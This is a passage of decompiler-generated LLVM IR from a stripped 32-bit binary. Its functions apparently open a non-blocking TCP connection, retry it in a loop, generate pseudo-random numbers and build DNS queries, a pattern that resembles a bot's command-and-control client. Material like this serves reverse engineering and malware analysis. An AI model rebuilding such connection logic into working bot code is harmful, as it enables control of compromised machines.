  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 1, i32* %stack_var_-12, align 4
  %v3_804d7f3 = call i32 @function_8050345(i32 2, i32 1, i32 0)
  store i32 %v3_804d7f3, i32* @global_var_8053028.25, align 8
  %v10_804d802 = icmp eq i32 %v3_804d7f3, -1
  br i1 %v10_804d802, label %dec_label_pc_804d8a0, label %dec_label_pc_804d80b

dec_label_pc_804d80b:                             ; preds = %dec_label_pc_804d7e0
  %v2_804d810 = ptrtoint i32* %stack_var_-12 to i32
  %v5_804d81a = call i32 @function_805030a(i32 %v3_804d7f3, i32 1, i32 2, i32 %v2_804d810, i32 4)
  %v0_804d822 = load i32, i32* @global_var_8053028.25, align 8
  %v3_804d82c = call i32 @function_804fa8d(i32 %v0_804d822, i32 3, i32 0)
  %v12_804d834 = or i32 %v3_804d82c, 2048
  %v0_804d838 = load i32, i32* @global_var_8053028.25, align 8
  %v3_804d840 = call i32 @function_804fa8d(i32 %v0_804d838, i32 4, i32 %v12_804d834)
  %v0_804d84d = load i8, i8* @global_var_8053034.26, align 4
  %v1_804d84d = icmp eq i8 %v0_804d84d, 0
  br i1 %v1_804d84d, label %dec_label_pc_804d8a6, label %dec_label_pc_804d856

dec_label_pc_804d856:                             ; preds = %dec_label_pc_804d80b, %dec_label_pc_804d8a6
  store i32 2, i32* %stack_var_-28, align 4
  %v1_804d868 = call i32 @function_8050089(i32 2)
  %v2_804d86d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v1_804d868, i32* @ebx, align 4
  %v1_804d873 = inttoptr i32 %v1_804d868 to i32*
  store i32 0, i32* %v1_804d873, align 4
  %v0_804d87a = load i32, i32* @global_var_8053028.25, align 8
  %v4_804d883 = call i32 @function_805013f(i32 %v0_804d87a, i32 %v2_804d86d, i32 16, i32 %v1_804d868)
  %v8_804d88b = icmp eq i32 %v4_804d883, -1
  br i1 %v8_804d88b, label %dec_label_pc_804d8b0, label %dec_label_pc_804d88e

dec_label_pc_804d88e:                             ; preds = %dec_label_pc_804d856
  %v0_804d88e = load i32, i32* @global_var_8053028.25, align 8
  %v2_804d898 = call i32 @function_80501fb(i32 %v0_804d88e, i32 1)
  br label %dec_label_pc_804d8a0

dec_label_pc_804d8a0:                             ; preds = %dec_label_pc_804d7e0, %dec_label_pc_804d88e
  %v0_804d8a5 = phi i32 [ -1, %dec_label_pc_804d7e0 ], [ %v2_804d898, %dec_label_pc_804d88e ]
  ret i32 %v0_804d8a5

dec_label_pc_804d8a6:                             ; preds = %dec_label_pc_804d80b
  br label %dec_label_pc_804d856

dec_label_pc_804d8b0:                             ; preds = %dec_label_pc_804d856
  %v0_804d8b0 = load i32, i32* @ebx, align 4
  %v1_804d8b0 = inttoptr i32 %v0_804d8b0 to i32*
  %v2_804d8b0 = load i32, i32* %v1_804d8b0, align 4
  %v11_804d8b0 = icmp eq i32 %v2_804d8b0, 99
  br i1 %v11_804d8b0, label %dec_label_pc_804d90e, label %dec_label_pc_804d8b5

dec_label_pc_804d8b5:                             ; preds = %dec_label_pc_804d8b0, %dec_label_pc_804d90e
  store i32 2, i32* %stack_var_-28, align 4
  %v0_804d8cf = load i32, i32* @global_var_8053028.25, align 8
  store i32 %v0_804d8cf, i32* @esi, align 4
  %v4_804d8d6 = call i32 @function_805016a(i32 %v0_804d8cf, i32 %v2_804d86d, i32 16, i32 0)
  %v1_804d8e2 = call i32 @function_8051700(i32 5)
  store i32 5, i32* @ebx, align 4
  %v0_804d8e8 = load i32, i32* @global_var_8053028.25, align 8
  %v1_804d8ef = call i32 @function_804fb51(i32 %v0_804d8e8)
  %v1_804d8fb = call i32 @function_804ca10(i32 58811)
  %v0_804d900 = call i32 @function_804d7e0()
  ret i32 %v0_804d900

dec_label_pc_804d90e:                             ; preds = %dec_label_pc_804d8b0
  store i8 0, i8* @global_var_8053034.26, align 4
  br label %dec_label_pc_804d8b5

; uselistorder directives
  uselistorder i32 %v3_804d7f3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32 (i32)* @function_804ca10, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_80501fb, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_805013f, { 1, 0 }
  uselistorder i8* @global_var_8053034.26, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_805030a, { 1, 0 }
  uselistorder label %dec_label_pc_804d8b5, { 1, 0 }
  uselistorder label %dec_label_pc_804d8a0, { 1, 0 }
  uselistorder label %dec_label_pc_804d856, { 1, 0 }
}

define i32 @function_804d920() local_unnamed_addr {
dec_label_pc_804d920:
  %stack_var_-12 = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp4, i32* %stack_var_-12, align 4
  %stack_var_-28 = alloca i8*, align 4
  store i8* inttoptr (i32 3 to i8*), i8** %stack_var_-28, align 4
  %v3_804d927 = call i32 @function_804ec60(i8 3)
  store i8* inttoptr (i32 3 to i8*), i8** %stack_var_-28, align 4
  %v4_804d932 = call i32 @function_804ebb0(i32 3, i32* null)
  %v4_804d937 = inttoptr i32 %v4_804d932 to i8*
  store i8* %v4_804d937, i8** %stack_var_-28, align 4
  %v3_804d93a = call i32 @function_804e710(i8* %v4_804d937)
  store i32 %v3_804d93a, i32* @esi, align 4
  store i8* inttoptr (i32 3 to i8*), i8** %stack_var_-28, align 4
  %v3_804d948 = call i32 @function_804ebe0(i8 3)
  %v2_804d950 = icmp eq i32 %v3_804d93a, 0
  br i1 %v2_804d950, label %dec_label_pc_804d9a6, label %dec_label_pc_804d954

dec_label_pc_804d954:                             ; preds = %dec_label_pc_804d920
  %v1_804d93f = inttoptr i32 %v3_804d93a to i8*
  %v2_804d954 = add i32 %v3_804d93a, 4
  %v3_804d954 = inttoptr i32 %v2_804d954 to i32*
  %v4_804d954 = load i32, i32* %v3_804d954, align 4
  store i32 %v4_804d954, i32* @ebx, align 4
  %v0_804d957 = load i8*, i8** %stack_var_-28, align 4
  %v1_804d957 = ptrtoint i8* %v0_804d957 to i32
  %v2_804d957 = call i32 @function_804e440(i32 %v1_804d957)
  %v3_804d957 = sext i32 %v2_804d957 to i64
  %v3_804d961 = load i8, i8* %v1_804d93f, align 1
  %v8_804d967 = zext i8 %v3_804d961 to i64
  %v11_804d967 = urem i64 %v3_804d957, %v8_804d967
  %v12_804d967 = trunc i64 %v11_804d967 to i32
  %v0_804d969 = load i32, i32* @ebx, align 4
  %v2_804d969 = mul nuw nsw i32 %v12_804d967, 4
  %v3_804d969 = add i32 %v2_804d969, %v0_804d969
  %v4_804d969 = inttoptr i32 %v3_804d969 to i32*
  %v5_804d969 = load i32, i32* %v4_804d969, align 4
  %tmp10 = bitcast i8** %stack_var_-28 to i32*
  store i32 %v3_804d93a, i32* %tmp10, align 4
  store i32 %v5_804d969, i32* @global_var_8053114.28, align 4
  %v2_804d972 = call i32 @function_804e6d0(i32 %v3_804d93a)
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-28, align 4
  %v3_804d97e = call i32 @function_804ec60(i8 4)
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-28, align 4
  %v4_804d989 = call i32 @function_804ebb0(i32 4, i32* null)
  %v5_804d989 = inttoptr i32 %v4_804d989 to i16*
  %v3_804d98e = load i16, i16* %v5_804d989, align 2
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-28, align 4
  store i16 %v3_804d98e, i16* bitcast (i32* @global_var_8053112.29 to i16*), align 4
  %v3_804d99e = call i32 @function_804ebe0(i8 4)
  %v2_804d9a6.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804d9a6

dec_label_pc_804d9a6:                             ; preds = %dec_label_pc_804d920, %dec_label_pc_804d954
  %v2_804d9a6 = phi i32 [ %tmp4, %dec_label_pc_804d920 ], [ %v2_804d9a6.pre, %dec_label_pc_804d954 ]
  ret i32 %v2_804d9a6

; uselistorder directives
  uselistorder i32 %v3_804d93a, { 2, 1, 0, 5, 3, 4 }
  uselistorder i8** %stack_var_-28, { 7, 6, 5, 0, 8, 4, 3, 2, 1 }
  uselistorder i32 (i8)* @function_804ebe0, { 0, 1, 23, 24, 25, 26, 27, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 28, 29, 30, 31 }
  uselistorder i32 (i32, i32*)* @function_804ebb0, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 43, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 45, 46, 47, 48 }
  uselistorder label %dec_label_pc_804d9a6, { 1, 0 }
}

define i32 @function_804e440(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e440:
  %v0_804e440 = load i32, i32* @global_var_80530cc.30, align 4
  %v0_804e448 = load i32, i32* @global_var_80530d8.31, align 8
  %v2_804e44e = mul i32 %v0_804e440, 2048
  %v2_804e453 = udiv i32 %v0_804e448, 524288
  %v2_804e456 = xor i32 %v2_804e44e, %v0_804e440
  %v0_804e458 = load i32, i32* @global_var_80530d0.32, align 16
  store i32 %v0_804e458, i32* @global_var_80530cc.30, align 4
  %v0_804e462 = load i32, i32* @global_var_80530d4.33, align 4
  store i32 %v0_804e462, i32* @global_var_80530d0.32, align 16
  store i32 %v0_804e448, i32* @global_var_80530d4.33, align 4
  %v2_804e474 = xor i32 %v2_804e453, %v0_804e448
  %v2_804e476 = udiv i32 %v2_804e456, 256
  %v2_804e479 = xor i32 %v2_804e476, %v2_804e456
  %v2_804e47b = xor i32 %v2_804e479, %v2_804e474
  store i32 %v2_804e47b, i32* @global_var_80530d8.31, align 8
  ret i32 %v2_804e47b

; uselistorder directives
  uselistorder i32 %v2_804e456, { 1, 0 }
  uselistorder i32 %v0_804e448, { 1, 2, 0 }
  uselistorder i32 %v0_804e440, { 1, 0 }
}

define i32 @function_804e6d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e6d0:
  %stack_var_-12 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-12, align 4
  %v0_804e6d0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804e6d8 = icmp eq i32 %arg1, 0
  br i1 %v1_804e6d8, label %dec_label_pc_804e6d0.dec_label_pc_804e700_crit_edge, label %dec_label_pc_804e6dc

dec_label_pc_804e6d0.dec_label_pc_804e700_crit_edge: ; preds = %dec_label_pc_804e6d0
  br label %dec_label_pc_804e700

dec_label_pc_804e6dc:                             ; preds = %dec_label_pc_804e6d0
  %v1_804e6dc = add i32 %arg1, 4
  %v2_804e6dc = inttoptr i32 %v1_804e6dc to i32*
  %v3_804e6dc = load i32, i32* %v2_804e6dc, align 4
  %v1_804e6df = icmp eq i32 %v3_804e6dc, 0
  br i1 %v1_804e6df, label %dec_label_pc_804e6ef, label %dec_label_pc_804e6e3

dec_label_pc_804e6e3:                             ; preds = %dec_label_pc_804e6dc
  %v1_804e6e7 = call i32 @function_80512a9(i32 %v3_804e6dc)
  br label %dec_label_pc_804e6ef

dec_label_pc_804e6ef:                             ; preds = %dec_label_pc_804e6dc, %dec_label_pc_804e6e3
  store i32 %v0_804e6d0, i32* @ebx, align 4
  %v1_804e6f6 = call i32 @function_80512a9(i32 %arg1)
  %v2_804e700.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804e700

dec_label_pc_804e700:                             ; preds = %dec_label_pc_804e6d0.dec_label_pc_804e700_crit_edge, %dec_label_pc_804e6ef
  %v2_804e700 = phi i32 [ %tmp12, %dec_label_pc_804e6d0.dec_label_pc_804e700_crit_edge ], [ %v2_804e700.pre, %dec_label_pc_804e6ef ]
  ret i32 %v2_804e700

; uselistorder directives
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804e700, { 1, 0 }
  uselistorder label %dec_label_pc_804e6ef, { 1, 0 }
}

define i32 @function_804e710(i8* %arg1) local_unnamed_addr {
dec_label_pc_804e710:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-2207 = alloca i32, align 4
  %stack_var_-2208 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v4_804e71c = ptrtoint i8* %arg1 to i32
  store i32 %v4_804e71c, i32* @ebx, align 4
  %v4_804e727 = call i32 @function_8050c58(i64 1, i32 8)
  %v2_804e730 = ptrtoint i32* %stack_var_-2208 to i32
  store i32 %v2_804e730, i32* %eax.global-to-local, align 4
  %tmp102 = bitcast i32* %stack_var_-2208 to i8*
  %v0_804e73b = load i32, i32* @ebx, align 4
  %v4_804e73b = inttoptr i32 %v0_804e73b to i8*
  %v3_804e73e = call i32 @function_804f5b0(i8* %v4_804e73b)
  %v2_804e743 = ptrtoint i32* %stack_var_-2207 to i32
  store i32 %v2_804e743, i32* %ecx.global-to-local, align 4
  store i32 %v2_804e730, i32* %edi.global-to-local, align 4
  %v1_804e74e = add i32 %v3_804e73e, 1
  store i32 %v1_804e74e, i32* %eax.global-to-local, align 4
  %tmp103 = icmp slt i32 %v1_804e74e, 1
  br i1 %tmp103, label %dec_label_pc_804e77a, label %dec_label_pc_804e762.lr.ph

dec_label_pc_804e762.lr.ph:                       ; preds = %dec_label_pc_804e710
  %v0_804e762.pre = load i32, i32* @ebx, align 4
  %v4_804e762.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e762

dec_label_pc_804e754:                             ; preds = %dec_label_pc_804e769
  %v3_804e754 = inttoptr i32 %v2_804e754 to i8*
  store i8 %v2_804e762, i8* %v3_804e754, align 1
  %v0_804e756 = load i32, i32* @esi, align 4
  %v1_804e756 = add i32 %v0_804e756, 1
  store i32 %v1_804e756, i32* @esi, align 4
  %v0_804e757 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e757 = add i32 %v0_804e757, 1
  store i32 %v1_804e757, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e75a

dec_label_pc_804e75a:                             ; preds = %dec_label_pc_804e76d, %dec_label_pc_804e754
  %v0_804e75c = phi i32 [ %v1_804e773, %dec_label_pc_804e76d ], [ %v1_804e757, %dec_label_pc_804e754 ]
  %v0_804e75a = load i32, i32* @ebx, align 4
  %v1_804e75a = add i32 %v0_804e75a, 1
  store i32 %v1_804e75a, i32* @ebx, align 4
  %v0_804e75b = load i32, i32* %eax.global-to-local, align 4
  %v1_804e75b = add i32 %v0_804e75b, -1
  store i32 %v1_804e75b, i32* %eax.global-to-local, align 4
  store i32 %v0_804e75c, i32* %ecx.global-to-local, align 4
  %tmp104 = icmp slt i32 %v1_804e75b, 1
  br i1 %tmp104, label %dec_label_pc_804e75e.dec_label_pc_804e77a_crit_edge, label %dec_label_pc_804e762

dec_label_pc_804e762:                             ; preds = %dec_label_pc_804e762.lr.ph, %dec_label_pc_804e75a
  %v2_804e754 = phi i32 [ %v2_804e743, %dec_label_pc_804e762.lr.ph ], [ %v0_804e75c, %dec_label_pc_804e75a ]
  %v4_804e762 = phi i32 [ %v4_804e762.pre, %dec_label_pc_804e762.lr.ph ], [ %v0_804e75c, %dec_label_pc_804e75a ]
  %v0_804e762 = phi i32 [ %v0_804e762.pre, %dec_label_pc_804e762.lr.ph ], [ %v1_804e75a, %dec_label_pc_804e75a ]
  %v1_804e762 = inttoptr i32 %v0_804e762 to i8*
  %v2_804e762 = load i8, i8* %v1_804e762, align 1
  %v3_804e762 = zext i8 %v2_804e762 to i32
  %v5_804e762 = and i32 %v4_804e762, -256
  %v6_804e762 = or i32 %v3_804e762, %v5_804e762
  store i32 %v6_804e762, i32* %edx.global-to-local, align 4
  %v10_804e764 = icmp eq i8 %v2_804e762, 46
  br i1 %v10_804e764, label %dec_label_pc_804e76d, label %dec_label_pc_804e769

dec_label_pc_804e769:                             ; preds = %dec_label_pc_804e762
  %v4_804e769 = icmp eq i8 %v2_804e762, 0
  %v1_804e76b = icmp eq i1 %v4_804e769, false
  br i1 %v1_804e76b, label %dec_label_pc_804e754, label %dec_label_pc_804e76d

dec_label_pc_804e76d:                             ; preds = %dec_label_pc_804e769, %dec_label_pc_804e762
  %v0_804e76d = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v1_804e771 = trunc i32 %v0_804e76d to i8
  %v2_804e771 = load i32, i32* %edi.global-to-local, align 4
  %v3_804e771 = inttoptr i32 %v2_804e771 to i8*
  store i8 %v1_804e771, i8* %v3_804e771, align 1
  %v0_804e773 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e773 = add i32 %v0_804e773, 1
  store i32 %v1_804e773, i32* %edx.global-to-local, align 4
  store i32 %v0_804e773, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e75a

dec_label_pc_804e75e.dec_label_pc_804e77a_crit_edge: ; preds = %dec_label_pc_804e75a
  br label %dec_label_pc_804e77a

dec_label_pc_804e77a:                             ; preds = %dec_label_pc_804e75e.dec_label_pc_804e77a_crit_edge, %dec_label_pc_804e710
  %v0_804e77d = phi i32 [ %v0_804e75c, %dec_label_pc_804e75e.dec_label_pc_804e77a_crit_edge ], [ %v2_804e743, %dec_label_pc_804e710 ]
  %v1_804e77d = inttoptr i32 %v0_804e77d to i8*
  store i8 0, i8* %v1_804e77d, align 1
  store i32 %v2_804e730, i32* %eax.global-to-local, align 4
  %v3_804e785 = call i32 @function_804f5b0(i8* %tmp102)
  store i32 0, i32* %stack_var_-44, align 4
  %v2_804e799 = add i32 %v3_804e785, %v2_804e730
  store i32 %v2_804e799, i32* @edi, align 4
  %v1_804e7bd = add i32 %v2_804e799, 1
  store i32 %v1_804e7bd, i32* @ebx, align 4
  store i32 %v2_804e730, i32* %eax.global-to-local, align 4
  %v3_804e7c5 = call i32 @function_804f5b0(i8* %tmp102)
  %v1_804e7ca = add i32 %v3_804e7c5, 17
  store i32 %v1_804e7ca, i32* %eax.global-to-local, align 4
  %v1_804e7d1 = call i32 @function_804e440(i32 %v1_804e7ca)
  %v2_804e7df = udiv i32 %v1_804e7d1, 65535
  store i32 %v2_804e7df, i32* %edx.global-to-local, align 4
  %v2_804e7e979 = add i32 %v2_804e7df, %v1_804e7d1
  store i32 %v2_804e7e979, i32* @esi, align 4
  store i32 8, i32* @eax, align 4
  store i32 -1, i32* %ebp.global-to-local, align 4
  %v2_804e7f9 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804e7f9, i32* %ecx.global-to-local, align 4
  %v3_804e801 = call i32 @function_804f640(i32 %v2_804e7f9, i32 16)
  store i32 %v3_804e801, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_804e849 = load i32, i32* @edi, align 4
  %v1_804e849 = add i32 %v0_804e849, 1
  %v2_804e849 = inttoptr i32 %v1_804e849 to i16*
  store i16 256, i16* %v2_804e849, align 2
  %v0_804e852 = load i32, i32* @ebx, align 4
  %v1_804e852 = add i32 %v0_804e852, 2
  %v2_804e852 = inttoptr i32 %v1_804e852 to i16*
  store i16 256, i16* %v2_804e852, align 2
  %v0_804e858 = load i32, i32* %ebp.global-to-local, align 4
  %v10_804e858 = icmp eq i32 %v0_804e858, -1
  br i1 %v10_804e858, label %dec_label_pc_804e86c.preheader, label %dec_label_pc_804e860

dec_label_pc_804e860.loopexit:                    ; preds = %dec_label_pc_804e985
  %v0_804e863.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804e860

dec_label_pc_804e860:                             ; preds = %dec_label_pc_804e860.loopexit, %dec_label_pc_804e77a
  %v0_804e863 = phi i32 [ %v0_804e863.pre, %dec_label_pc_804e860.loopexit ], [ %v0_804e858, %dec_label_pc_804e77a ]
  %v0_804e860 = load i32, i32* @esp, align 4
  %v2_804e863 = add i32 %v0_804e860, -16
  %v3_804e863 = inttoptr i32 %v2_804e863 to i32*
  store i32 %v0_804e863, i32* %v3_804e863, align 4
  %v1_804e864 = call i32 @function_804fb51(i32 1)
  store i32 %v1_804e864, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e86c.preheader

dec_label_pc_804e86c.preheader:                   ; preds = %dec_label_pc_804e860, %dec_label_pc_804e77a
  br label %dec_label_pc_804e86c

dec_label_pc_804e86c:                             ; preds = %dec_label_pc_804e86c.preheader, %dec_label_pc_804e985
  %v0_804e86c = load i32, i32* @ebx, align 4
  %v1_804e86c = load i32, i32* @esp, align 4
  %v2_804e86c = add i32 %v1_804e86c, -4
  %v3_804e86c = inttoptr i32 %v2_804e86c to i32*
  store i32 %v0_804e86c, i32* %v3_804e86c, align 4
  %v1_804e86d = add i32 %v1_804e86c, -8
  %v2_804e86d = inttoptr i32 %v1_804e86d to i32*
  store i32 0, i32* %v2_804e86d, align 4
  %v1_804e86f = add i32 %v1_804e86c, -12
  %v2_804e86f = inttoptr i32 %v1_804e86f to i32*
  store i32 2, i32* %v2_804e86f, align 4
  %v1_804e871 = add i32 %v1_804e86c, -16
  %v2_804e871 = inttoptr i32 %v1_804e871 to i32*
  store i32 2, i32* %v2_804e871, align 4
  %v3_804e873 = call i32 @function_8050345(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e873, i32* %eax.global-to-local, align 4
  %v0_804e878 = load i32, i32* @esp, align 4
  store i32 %v3_804e873, i32* @ebp, align 4
  %v10_804e87d = icmp eq i32 %v3_804e873, -1
  br i1 %v10_804e87d, label %dec_label_pc_804e9a0, label %dec_label_pc_804e886

dec_label_pc_804e886:                             ; preds = %dec_label_pc_804e86c
  %v0_804e886 = load i32, i32* @ecx, align 4
  %v2_804e886 = add i32 %v0_804e878, 12
  %v3_804e886 = inttoptr i32 %v2_804e886 to i32*
  store i32 %v0_804e886, i32* %v3_804e886, align 4
  %v1_804e887 = add i32 %v0_804e878, 8
  %v2_804e887 = inttoptr i32 %v1_804e887 to i32*
  store i32 16, i32* %v2_804e887, align 4
  %v1_804e889 = add i32 %v0_804e878, 4272
  store i32 %v1_804e889, i32* @edi, align 4
  %v2_804e890 = add i32 %v0_804e878, 4
  %v3_804e890 = inttoptr i32 %v2_804e890 to i32*
  store i32 %v1_804e889, i32* %v3_804e890, align 4
  %v3_804e891 = inttoptr i32 %v0_804e878 to i32*
  store i32 %v3_804e873, i32* %v3_804e891, align 4
  %v4_804e892 = call i32 @function_805016a(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804e897 = load i32, i32* @esp, align 4
  %v1_804e89a = add i32 %v4_804e892, 1
  %v8_804e89a = icmp eq i32 %v1_804e89a, 0
  store i32 %v1_804e89a, i32* %eax.global-to-local, align 4
  br i1 %v8_804e89a, label %dec_label_pc_804e9a0, label %dec_label_pc_804e8a1

dec_label_pc_804e8a1:                             ; preds = %dec_label_pc_804e886
  %v1_804e8a1 = add i32 %v0_804e897, 12
  %v2_804e8a1 = inttoptr i32 %v1_804e8a1 to i32*
  store i32 16384, i32* %v2_804e8a1, align 4
  %v1_804e8a6 = add i32 %v0_804e897, 20
  %v2_804e8a6 = inttoptr i32 %v1_804e8a6 to i32*
  %v3_804e8a6 = load i32, i32* %v2_804e8a6, align 4
  store i32 %v3_804e8a6, i32* %edx.global-to-local, align 4
  %v2_804e8aa = add i32 %v0_804e897, 8
  %v3_804e8aa = inttoptr i32 %v2_804e8aa to i32*
  store i32 %v3_804e8a6, i32* %v3_804e8aa, align 4
  %v1_804e8ab = add i32 %v0_804e897, 2096
  store i32 %v1_804e8ab, i32* %eax.global-to-local, align 4
  %v2_804e8b2 = add i32 %v0_804e897, 4
  %v3_804e8b2 = inttoptr i32 %v2_804e8b2 to i32*
  store i32 %v1_804e8ab, i32* %v3_804e8b2, align 4
  %v0_804e8b3 = load i32, i32* @ebp, align 4
  %v3_804e8b3 = inttoptr i32 %v0_804e897 to i32*
  store i32 %v0_804e8b3, i32* %v3_804e8b3, align 4
  %v0_804e8b4 = call i32 @function_8050294()
  %v0_804e8b9 = load i32, i32* @esp, align 4
  %v1_804e8bc = add i32 %v0_804e8b4, 1
  %v8_804e8bc = icmp eq i32 %v1_804e8bc, 0
  store i32 %v1_804e8bc, i32* %eax.global-to-local, align 4
  br i1 %v8_804e8bc, label %dec_label_pc_804e9a0, label %dec_label_pc_804e8c3

dec_label_pc_804e8c3:                             ; preds = %dec_label_pc_804e8a1
  %v2_804e8c3 = add i32 %v0_804e8b9, 12
  %v3_804e8c3 = inttoptr i32 %v2_804e8c3 to i32*
  store i32 %v1_804e8bc, i32* %v3_804e8c3, align 4
  %v1_804e8c4 = add i32 %v0_804e8b9, 8
  %v2_804e8c4 = inttoptr i32 %v1_804e8c4 to i32*
  store i32 0, i32* %v2_804e8c4, align 4
  %v0_804e8c6 = load i32, i32* @ebp, align 4
  %v2_804e8c6 = add i32 %v0_804e8b9, 4
  %v3_804e8c6 = inttoptr i32 %v2_804e8c6 to i32*
  store i32 %v0_804e8c6, i32* %v3_804e8c6, align 4
  %v2_804e8c7 = inttoptr i32 %v0_804e8b9 to i32*
  store i32 3, i32* %v2_804e8c7, align 4
  %v3_804e8c9 = call i32 @function_804fa8d(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804e8ce = load i32, i32* @esp, align 4
  %v12_804e8d1 = or i32 %v3_804e8c9, 2048
  store i32 %v12_804e8d1, i32* %eax.global-to-local, align 4
  %v2_804e8d4 = add i32 %v0_804e8ce, 8
  %v3_804e8d4 = inttoptr i32 %v2_804e8d4 to i32*
  store i32 %v12_804e8d1, i32* %v3_804e8d4, align 4
  %v0_804e8d5 = load i32, i32* @ebp, align 4
  %v2_804e8d5 = add i32 %v0_804e8ce, 4
  %v3_804e8d5 = inttoptr i32 %v2_804e8d5 to i32*
  store i32 %v0_804e8d5, i32* %v3_804e8d5, align 4
  %v2_804e8d6 = inttoptr i32 %v0_804e8ce to i32*
  store i32 4, i32* %v2_804e8d6, align 4
  %v3_804e8d8 = call i32 @function_804fa8d(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804e8dd = load i32, i32* @esp, align 4
  %v1_804e8dd = add i32 %v0_804e8dd, 4144
  store i32 %v1_804e8dd, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_804e8eb = inttoptr i32 %v1_804e8dd to i8*
  store i32 %v1_804e8dd, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804e8ee = call i8* @_memset(i8* %v1_804e8eb, i32 0, i32 32)
  %v6_804e8ee = ptrtoint i8* %v5_804e8ee to i32
  store i32 %v6_804e8ee, i32* %ecx.global-to-local, align 4
  %v0_804e8f0 = load i32, i32* @ebp, align 4
  %v2_804e8f4 = udiv i32 %v0_804e8f0, 32
  store i32 %v2_804e8f4, i32* @esi, align 4
  %v1_804e8f7 = urem i32 %v0_804e8f0, 32
  store i32 %v1_804e8f7, i32* @ebx, align 4
  %v0_804e8fa = load i32, i32* @esp, align 4
  %v2_804e8fa = mul nuw nsw i32 %v2_804e8f4, 4
  %v3_804e8fa = add nuw nsw i32 %v2_804e8fa, 4144
  %v4_804e8fa = add i32 %v3_804e8fa, %v0_804e8fa
  %v5_804e8fa = inttoptr i32 %v4_804e8fa to i32*
  %v6_804e8fa = load i32, i32* %v5_804e8fa, align 4
  %v9_804e8fa = shl i32 1, %v1_804e8f7
  %v12_804e8fa = or i32 %v6_804e8fa, %v9_804e8fa
  store i32 %v12_804e8fa, i32* %v5_804e8fa, align 4
  %v0_804e902 = load i32, i32* @esp, align 4
  %v1_804e902 = add i32 %v0_804e902, 4288
  %v2_804e902 = inttoptr i32 %v1_804e902 to i32*
  store i32 5, i32* %v2_804e902, align 4
  %v0_804e90d = load i32, i32* @esp, align 4
  %v1_804e90d = add i32 %v0_804e90d, 4292
  %v2_804e90d = inttoptr i32 %v1_804e90d to i32*
  store i32 0, i32* %v2_804e90d, align 4
  %v0_804e918 = load i32, i32* @esp, align 4
  %v1_804e918 = inttoptr i32 %v0_804e918 to i32*
  %v1_804e919 = add i32 %v0_804e918, 4288
  store i32 %v1_804e919, i32* %v1_804e918, align 4
  %v0_804e921 = load i32, i32* @ebp, align 4
  %v1_804e921 = add i32 %v0_804e921, 1
  store i32 %v1_804e921, i32* %eax.global-to-local, align 4
  %v1_804e924 = add i32 %v0_804e918, -4
  %v2_804e924 = inttoptr i32 %v1_804e924 to i32*
  store i32 0, i32* %v2_804e924, align 4
  %v1_804e926 = add i32 %v0_804e918, -8
  %v2_804e926 = inttoptr i32 %v1_804e926 to i32*
  store i32 0, i32* %v2_804e926, align 4
  %v0_804e928 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e928 = add i32 %v0_804e918, -12
  %v3_804e928 = inttoptr i32 %v2_804e928 to i32*
  store i32 %v0_804e928, i32* %v3_804e928, align 4
  %v0_804e929 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e929 = add i32 %v0_804e918, -16
  %v3_804e929 = inttoptr i32 %v2_804e929 to i32*
  store i32 %v0_804e929, i32* %v3_804e929, align 4
  %v0_804e92a = call i32 @function_804fd58()
  store i32 %v0_804e92a, i32* %eax.global-to-local, align 4
  %v0_804e92f = load i32, i32* @esp, align 4
